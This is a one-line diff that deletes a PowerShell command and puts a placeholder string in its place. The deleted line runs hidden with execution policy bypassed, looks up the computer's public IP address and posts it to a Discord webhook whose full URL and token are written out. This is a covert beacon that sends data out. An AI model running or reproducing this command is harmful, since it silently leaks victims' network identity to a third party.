@@ -1,1 +1,1 @@
-powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "$ip=(Invoke-RestMethod -Uri 'http://ifconfig.me'); $body=@{content='🖥️ כתובת ה-IP של המחשב: ' + $ip} | ConvertTo-Json -Depth 2; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1189885690482266152/AI653-BtpYcKjISk6puUq0qlD5WOMZFBI-CbZv5n_uiKGjXAb5TZceNGtVvHylAAv1yu' -Method Post -Body $body -ContentType 'application/json'"
+xxxxxxxxxxxxxxxx
